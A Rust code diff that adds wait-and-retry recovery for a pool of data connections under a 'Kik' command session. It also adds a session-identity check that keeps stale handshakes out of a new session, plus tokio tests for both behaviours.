@@ -15,7 +15,7 @@ use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::sync::mpsc::{channel, Receiver, Sender};
-use tokio::sync::{Mutex, RwLock};
+use tokio::sync::{Mutex, Notify, RwLock};
 use tokio::time::timeout;
 
 const DATA_QUEUE_CAPACITY: usize = 2;
@@ -61,6 +61,8 @@ pub struct Kik {
     pub conn_op: Arc<RwLock<Option<Arc<Mutex<Channel>>>>>,
     /// 连接自身随机 ID 到写半连接的映射。
     data_conns: Arc<Mutex<HashMap<String, Arc<Mutex<Channel>>>>>,
+    /// 某个数据连接槽位重建成功时唤醒正在等待继续发送的文件任务。
+    data_connection_notify: Arc<Notify>,
     /// 多连接发送的轮询游标，不参与授权。
     next_data_conn: Arc<AtomicUsize>,
 }
@@ -70,23 +72,30 @@ impl Kik {
         Self {
             conn_op: Arc::new(RwLock::new(Some(channel))),
             data_conns: Arc::new(Mutex::new(HashMap::new())),
+            data_connection_notify: Arc::new(Notify::new()),
             next_data_conn: Arc::new(AtomicUsize::new(0)),
         }
+    }
+
+    /// 判断两个句柄是否指向同一轮主连接。
+    ///
+    /// 服务端可能给重连后的进程继续分配同一个 Kik ID，所以字符串 ID 不能区分新旧生命周期；
+    /// 使用主连接状态的 `Arc` 身份可阻止旧握手任务误加入新一轮连接池。
+    pub fn same_session(&self, other: &Self) -> bool {
+        Arc::ptr_eq(&self.conn_op, &other.conn_op)
     }
 
     pub async fn insert_data_conn(&self, data_chan: Arc<Mutex<Channel>>) -> anyhow::Result<()> {
         let id = data_chan.lock().await.require_id()?.to_string();
         self.data_conns.lock().await.insert(id, data_chan);
+        // 连接池从空恢复时可能有多个并发文件任务在等待；所有任务都应立即重新检查连接池。
+        self.data_connection_notify.notify_waiters();
         Ok(())
     }
 
     pub async fn delete_data_conn(&self, conn: Arc<Mutex<Channel>>) -> Option<Arc<Mutex<Channel>>> {
         let id = conn.lock().await.id().map(str::to_owned)?;
         self.data_conns.lock().await.remove(&id)
-    }
-
-    pub async fn find_data_conn(&self) -> Option<Arc<Mutex<Channel>>> {
-        self.data_connections_for_send().await.into_iter().next()
     }
 
     async fn data_connections_for_send(&self) -> Vec<Arc<Mutex<Channel>>> {
@@ -103,6 +112,39 @@ impl Kik {
             .take(count)
             .cloned()
             .collect()
+    }
+
+    /// 等待当前会话至少出现一条健康数据连接。
+    ///
+    /// 连接监督器会在断线后自动补建。发送任务在此保留尚未发送的完整帧，等待恢复后重试，
+    /// 而不是立刻让整次大文件传输失败；调用方提供硬超时，避免永久等待。
+    async fn wait_data_connections_for_send(
+        &self,
+        wait_timeout: Duration,
+    ) -> Vec<Arc<Mutex<Channel>>> {
+        let deadline = Instant::now() + wait_timeout;
+        loop {
+            let notified = self.data_connection_notify.notified();
+            tokio::pin!(notified);
+            // `notified()` 只有被轮询后才会真正进入等待队列。先 enable 再检查连接池，才能让
+            // notify_waiters 覆盖“检查为空”之前已创建、但尚未 await 的等待者。
+            notified.as_mut().enable();
+            let candidates = self.data_connections_for_send().await;
+            let mut healthy = Vec::with_capacity(candidates.len());
+            for connection in candidates {
+                if !connection.lock().await.is_closed() {
+                    healthy.push(connection);
+                }
+            }
+            if !healthy.is_empty() {
+                return healthy;
+            }
+
+            let remaining = deadline.saturating_duration_since(Instant::now());
+            if remaining.is_zero() || timeout(remaining, notified.as_mut()).await.is_err() {
+                return Vec::new();
+            }
+        }
     }
 
     pub async fn delete_kik_conn(&self) -> Option<Arc<Mutex<Channel>>> {
@@ -274,29 +316,31 @@ impl Context {
         self.data_routes.lock().await.remove(key);
     }
 
-    pub async fn insert_data_conn(&self, conn: Arc<Mutex<Channel>>) -> anyhow::Result<()> {
-        let kik = self
+    /// 仅把数据连接加入创建它的那一轮 Kik 主会话。
+    pub async fn insert_data_conn_for(
+        &self,
+        expected: &Kik,
+        conn: Arc<Mutex<Channel>>,
+    ) -> anyhow::Result<()> {
+        let current = self
             .kik_op
             .lock()
             .await
             .clone()
             .ok_or_else(|| anyhow::Error::msg(hidden!("命令通道尚未初始化")))?;
-        kik.insert_data_conn(conn).await?;
-        Ok(())
+        if !current.same_session(expected) {
+            return Err(anyhow::Error::msg(hidden!("数据连接属于已结束的命令会话")));
+        }
+        expected.insert_data_conn(conn).await
     }
 
-    pub async fn delete_data_conn(&self, conn: Arc<Mutex<Channel>>) {
-        if let Some(kik) = self.kik_op.lock().await.clone() {
-            kik.delete_data_conn(conn).await;
-        }
-    }
-
-    pub async fn find_data_conn(&self) -> Option<Arc<Mutex<Channel>>> {
-        let kik = self.kik_op.lock().await.clone();
-        match kik {
-            Some(kik) => kik.find_data_conn().await,
-            None => None,
-        }
+    /// 供数据连接监督器判断主连接是否已经换代。
+    pub async fn is_current_kik(&self, expected: &Kik) -> bool {
+        self.kik_op
+            .lock()
+            .await
+            .as_ref()
+            .is_some_and(|current| current.same_session(expected))
     }
 
     /// 将下载 payload 编成完整帧，并在数据连接快照内轮询/失败换路。
@@ -308,18 +352,31 @@ impl Context {
             .await
             .clone()
             .ok_or_else(|| anyhow::Error::msg(hidden!("命令通道尚未初始化")))?;
+        let deadline = Instant::now() + common::channel::DATA_CONNECTION_RECOVERY_TIMEOUT;
         let mut last_error = None;
-        for connection in kik.data_connections_for_send().await {
-            let mut connection = connection.lock().await;
-            if connection.is_closed() {
-                continue;
+        loop {
+            let remaining = deadline.saturating_duration_since(Instant::now());
+            if remaining.is_zero() {
+                break;
             }
-            match connection.write_and_flush(&encoded).await {
-                Ok(()) => return Ok(()),
-                Err(error) => last_error = Some(error),
+            let connections = kik.wait_data_connections_for_send(remaining).await;
+            if connections.is_empty() {
+                break;
+            }
+            for connection in connections {
+                let mut connection = connection.lock().await;
+                match connection.write_and_flush(&encoded).await {
+                    Ok(()) => return Ok(()),
+                    Err(error) => {
+                        // 半帧连接不可复用；主动关闭会促使监督器尽快补建该槽位。
+                        connection.try_write_half_close().await;
+                        last_error = Some(error);
+                    }
+                }
             }
         }
-        Err(last_error.unwrap_or_else(|| anyhow::Error::msg(hidden!("Kik数据连接未初始化完成"))))
+        Err(last_error
+            .unwrap_or_else(|| anyhow::Error::msg(hidden!("Kik数据连接在恢复时限内不可用"))))
     }
 
     pub async fn clear(&self) {
@@ -371,4 +428,174 @@ async fn data_may_arrive_before_its_command_on_an_independent_connection() {
         b"unsolicited-payload-test-value"[..]
     );
     context.remove_data_route("unsolicited-route-test-id").await;
+}
+
+#[tokio::test]
+async fn sender_waits_for_a_recovered_data_connection() {
+    let context = Context::new();
+    let (_main_peer, main_stream) = tokio::io::duplex(4096);
+    let main_channel = Arc::new(Mutex::new(Channel::new(
+        Box::pin(main_stream),
+        Some("kik-test".to_string()),
+        common::channel::ChannelType::Kik,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    )));
+    let kik = Kik::new(main_channel);
+    context.set_kik(Some(kik.clone())).await;
+
+    let send_context = context.clone();
+    let send_task = tokio::spawn(async move {
+        send_context
+            .send_data_with_id("recovery-data-id", b"payload")
+            .await
+    });
+    tokio::time::sleep(Duration::from_millis(20)).await;
+    assert!(
+        !send_task.is_finished(),
+        "没有连接时发送任务应等待监督器恢复"
+    );
+
+    let (_data_peer, data_stream) = tokio::io::duplex(4096);
+    let data_channel = Arc::new(Mutex::new(Channel::new(
+        Box::pin(data_stream),
+        Some("data-connection".to_string()),
+        common::channel::ChannelType::KikData,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    )));
+    context
+        .insert_data_conn_for(&kik, data_channel)
+        .await
+        .unwrap();
+    tokio::time::timeout(Duration::from_secs(1), send_task)
+        .await
+        .expect("数据连接恢复后发送任务应立即继续")
+        .unwrap()
+        .unwrap();
+}
+
+#[tokio::test]
+async fn pool_recovery_wakes_all_concurrent_waiters() {
+    let (_main_peer, main_stream) = tokio::io::duplex(4096);
+    let main_channel = Arc::new(Mutex::new(Channel::new(
+        Box::pin(main_stream),
+        Some("kik-broadcast-test".to_string()),
+        common::channel::ChannelType::Kik,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    )));
+    let kik = Kik::new(main_channel);
+
+    // 模拟多个并行文件请求同时遇到整个数据池离线。恢复一条连接后，每个请求都应立刻
+    // 重新检查共享池，而不是只有一个请求被唤醒、其余请求一直等待到恢复超时。
+    let mut waiters = Vec::new();
+    for _ in 0..8 {
+        let waiting_kik = kik.clone();
+        waiters.push(tokio::spawn(async move {
+            waiting_kik
+                .wait_data_connections_for_send(Duration::from_secs(2))
+                .await
+                .len()
+        }));
+    }
+    tokio::time::sleep(Duration::from_millis(20)).await;
+
+    let (_data_peer, data_stream) = tokio::io::duplex(4096);
+    let data_channel = Arc::new(Mutex::new(Channel::new(
+        Box::pin(data_stream),
+        Some("recovered-data-connection".to_string()),
+        common::channel::ChannelType::KikData,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    )));
+    assert!(kik.insert_data_conn(data_channel).await.is_ok());
+
+    tokio::time::timeout(Duration::from_millis(500), async {
+        for waiter in waiters {
+            assert_eq!(waiter.await.unwrap(), 1);
+        }
+    })
+    .await
+    .expect("连接池恢复应广播唤醒所有并发等待者");
+}
+
+#[tokio::test]
+async fn stale_data_handshake_cannot_join_a_new_main_session() {
+    let context = Context::new();
+    let (_old_peer, old_stream) = tokio::io::duplex(64);
+    let old_kik = Kik::new(Arc::new(Mutex::new(Channel::new(
+        Box::pin(old_stream),
+        Some("same-kik-id".to_string()),
+        common::channel::ChannelType::Kik,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    ))));
+    let (_new_peer, new_stream) = tokio::io::duplex(64);
+    let new_kik = Kik::new(Arc::new(Mutex::new(Channel::new(
+        Box::pin(new_stream),
+        Some("same-kik-id".to_string()),
+        common::channel::ChannelType::Kik,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    ))));
+    context.set_kik(Some(new_kik)).await;
+
+    let (_data_peer, data_stream) = tokio::io::duplex(64);
+    let stale_data = Arc::new(Mutex::new(Channel::new(
+        Box::pin(data_stream),
+        Some("late-old-data".to_string()),
+        common::channel::ChannelType::KikData,
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+        Err(std::io::Error::new(
+            std::io::ErrorKind::NotConnected,
+            "test",
+        )),
+    )));
+    assert!(
+        context
+            .insert_data_conn_for(&old_kik, stale_data)
+            .await
+            .is_err(),
+        "相同字符串 ID 不能让旧会话数据连接混入新连接池"
+    );
 }
